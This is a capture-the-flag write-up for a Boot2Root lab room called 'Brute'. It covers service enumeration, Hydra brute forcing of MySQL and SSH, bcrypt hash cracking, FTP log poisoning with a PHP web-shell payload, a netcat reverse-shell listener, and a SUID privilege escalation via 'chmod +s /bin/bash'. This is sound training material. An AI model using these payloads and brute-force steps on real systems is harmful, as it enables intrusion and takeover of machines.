# Brute Write-up

![Picture of the room](/Medium_rooms/Brute/Screenshots/00_Room.png)

Brute is a Medium difficulty themed Boot2Root room by the looks of it. I am guessing we will need to exploit a brute forcing vulnerability, so tools we might wanna use could be: **Hydra** for authentication brute forcing and , **Jumbo John** for hash cracking, or **GoBuster** for Web Directory brute forcing. Now let's get started

## Enumeration

My first approach is to gather information about running services on the victim host with exposed ports. To do this I use my basic Nmap command

```bash
nmap -sC -sV -sS  victim_IP
```

Simplified results:

```text
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
3306/tcp open  mysql   MySQL 8.0.41-0ubuntu0.20.04.1
```

You'll notice that FTP is running on it's default port and thus is not encrypted. We could theoretically try to brute force our way in  on three different Services: ftp, ssh and mysql. But the first step I would take is to check out the web page on port 80 using my Web Browser:

![Webpage](/Medium_rooms/Brute/Screenshots/01_Webpage.png)

And there, a Login page is hosted. Web page Logins aren't exclusively vulnerable to simple Brute force attacks. We can try vulnerabilities like SQL or NoSQL injection. I tired a simple SQL Injection but that failed

![SQL injection Attempt](/Medium_rooms/Brute/Screenshots/02_SQLi-Attempt.png)

Normally I would open Burp suite now to maybe identify an No SQL injection, but since this room is probably mostly about brute forcing, I will skip that and run a Gobuster dir mode command that will to try to find hidden directories. That failed though

![SQL injection Attempt](/Medium_rooms/Brute/Screenshots/03_Gobuster-result.png)

Okay, so now I will run Hydra and try to brute force the login. Since there isn't any information on the webpage, I will set the username as admin and hope there is an account in the database called like that

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.114.129.137 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password." -v -t32
```

I added the verbose flag `-v` and set the threads to 32 (`-t32`) to make the brute force faster. This scan though took too long. After roughly 8 minutes, I stopped the scan as it took too long, probably because of my LAN or Rate limiting applied by the Web page. Brute forcing FTP and SSH wont make any sense as we don't have a proper Username. Instead let's try if we can get some information out of the mySQL service which is open and running. Sadly I had no idea how to enumerate MySQL, but luckily I found a really useful post on LinkedIn: You can read it [here](https://www.linkedin.com/pulse/service-enumeration-mysql-rikunj-sindhwad-sfhzf)
I used nmap and tried every mysql Script to enumerate for users:

```bash
nmap -p 3306 -sV --script=mysql-* <target_ip>
```

![MySQL users](/Medium_rooms/Brute/Screenshots/04_MySQL-users.png)

Alright, now that's useful! We've got some users, so we can try to run another Hydra Brute force attempt. I looked up the Syntax for Hydra MySQL and ran it on every user

```bash
hydra -L users.txt -P  /usr/share/wordlists/rockyou.txt <target_ip> mysql -t32
```

That was really quick, I instantly found a password for root. Now lets connect to mysql using our found credentials

```bash
mysql -h target_ip -u root -p
```
> You might need to install mysql if you dont have it yet: `apt install mysql-client-core-8.0`

Now we will search the databases for valuable information. There is a Database called "website", if we could find a user and password there we may be able to login to the web page. 

![Hash in Database](/Medium_rooms/Brute/Screenshots/05_Password-hash.png)

I used an [online hash identifier](https://hashes.com/en/tools/hash_identifier) to identify the hash type of this hash. I then proceed to crack the hash with Jumbo John using the format `bcrypt` since it's a bcrypt hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txt
```

Finally we have valid credentials to log in to the web page. We've got the user from the database and the cracked hash. Once we log in, we are greeted with this page: 

![After log in](/Medium_rooms/Brute/Screenshots/06_Welcome-page.png)

Clicking on the log Button in the middle doesn't really do anything. I tried some Gobuster enumeration but got nothing as well. A dead end. There's still FTP and SSH open, so I tried using the same credentials from the Adrian user there. That also failed. I tried to look at the page again, but this time something appeared

![Failed FTP logs](/Medium_rooms/Brute/Screenshots/07_FTP-failed.png)

This confused me even more! I didn't know what to do, but it seemed suspicious that. I really dont like using AI for CTFs like that, but I got stuck and just had to ask. ChatGPT told me it could be some kind of log poisoning or Log Injection which could result in XSS. I did some research on Log poisoning and found this:
> The attacker sends malicious data - such as PHP code or command payloads - through HTTP headers like User-Agent or X-Forwarded-For. 

Since these logs aren't HTTP logs but FTP logs, maybe I could enter a PHP code through FTP. I thought I would need a successful Login via FTP to execute the command, so I wasted some time with that, until I found out I don't really need a valid session, I just need to be connected: `ftp <target_ip>`. Figuring out what kind of PHP command to type in wasn't that difficult. I looked up some Log Poisoning examples and found out attackers enter a simple PHP command that establishes a web shell:

```text
ftp <target_ip>
name: <?php system($_GET['cmd']); ?>
password: <?php system($_GET['cmd']); ?>
```
> I used it as both name and password since I didn't know which of them would trigger the vulnerability

Now we can use the web page as a web shell, if we manipulate the URL a tiny bit, for example:
`http://10.112.173.229/welcome.php?cmd=whoami` 

As you may know, a web shell isn't really pretty nifty for discovery and exploitation, so let's establish a reverse shell. First of all, we need a listener on our Attacker machine and a listening port. 
```bash
nc -lvnp 4445
```

Then, we will need to enter a command which will connect with our listener. I usually like to try 3 different commands: One simple bash reverse shell, one using busybox and one using python. The first two didn't work, but the python one gave a connection back! You can build reverse shells on [revshells](https://www.revshells.com/).

![Rev shell worked](/Medium_rooms/Brute/Screenshots/08_connection.png)

## Initial Access

Now that we got a reverse shell, it is time to gather information about the host. We are currently www-data. When we try to read the contents of the `user.txt` file located at Adrians home directory, we will need permission. However, there are hidden files in his home directory as well. Looking at the permissions, we can actually read some. Files I found to be interesting are: `.reminder` and `.sudo_as_admin_successful`. The sudo as admin file didn't contain anything, but .reminder did. 

![Adiran rules](/Medium_rooms/Brute/Screenshots/09_rules.png)

At first I was kinda confused, but this somehow reminded me of something Jumbo John can perform. I remembered John isn't limited to password or hash cracking, it can also generate Passwords based on rules to brute force Logins where you know specific rules, for Example, every password in the specified wordlist should be capitalized. I looked up both rules: best of 64 and + exclamation. best of 64 seems to be a rule already implemented in Jumbo John itself, but for the exclamation rule, you need to add it to your John.conf file (located in `/etc/john/john.conf`) . I added following line to the .conf file:

```bash
[list.Rules:Exclamation]
c$!
```
> I used the google overview AI for this rule as I don't really remember how to create John rules

Now, I saved that "ettubrute" in a file and generated variations of it using John

```bash
john --wordlist=word.txt --rules=best64 -stdout > variations
```

I then wanted to use the variations file as a wordlist and use my Exclamation rule next, but that somehow didn't work. Either I did a mistake or that google AI messed up. Anyways I added an exclamation mark to all of these variants myself. I know, not the best way to do it, but it was only about 64 entries. Anyways, let's use that file to bruteforce the password of Adrian!

```bash
hydra -l adrian -P variations ssh://target_ip
```

Using the password found by hydra, we will ssh into the target machine as the adrian user and grab the user flag! 

## Privilege escalation

Okay, even getting to the Adrian user took me long enough already, and now we need to escalate our privileges to root, which I must say I am not really great at. I tried some basic ones like checking the SUID executables, but I cant really seem to find anything interesting in all of them. So I took a step back and looked at the Adrian user again, as there were more files that just the ones I already mentioned. There is this `punch_in.sh` Only adrian can read, but root owns it. 

```text
-rw-r----- 1 adrian adrian  2660 Aug 19 17:14 punch_in
-rw-r----- 1 root   adrian    94 Apr  5  2022 punch_in.sh
```

Reading the script will show this:
```text
#!/bin/bash

/usr/bin/echo 'Punched in at '$(/usr/bin/date +"%H:%M") >> /home/adrian/punch_in
```

So it saved the result "Punched in at ..." in the punch_in file owned by Adrian. It runs as /bin/bash, so if we could somehow add a SUID bit to that file, we might get root privileges. However, we need to find a way to do so. There is also a ftp directory in adrians home, and that contains a files directory. There are two files, a script file which file type is a shell script, and a text file called "note", both are owned by adrian. Adrian planned a revenge and actually gave us a key to root. The script reads the last line of the punch_in in Adrians home. If we edit it and add a command which could give us root, we would be done already! 

![Adiran rules](/Medium_rooms/Brute/Screenshots/10_useful-script.png)

One command that could help us with our objective, would be `chmod +s /bin/bash`. So edit the file and add it to the last line of `punch_in` in `/home/adrian`. You might need to write it in there in back quotes: "`chmod +s /bin/bash`" . (md files automatically change it to a command, so make sure to add them. 

After some time, /bin/bash will have a SUID bit. It should look like this:
```text
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

And then, you just need to run the Binary and you will be root
```bash
/bin/bash -p
```

Now just navigate to the `/root` directory!

## Conclusion

Okay, that took me really longer than I wanted it to, I spent my whole afternoon on this one! Boot2Root challenges really take some time, it is important to not lose concentration while doing them, I noticed. I don't want to lie, even I had to get some help from AI for this room, especially for the privilege escalation part. However, I learned some important things from this room and overall it was really fun! 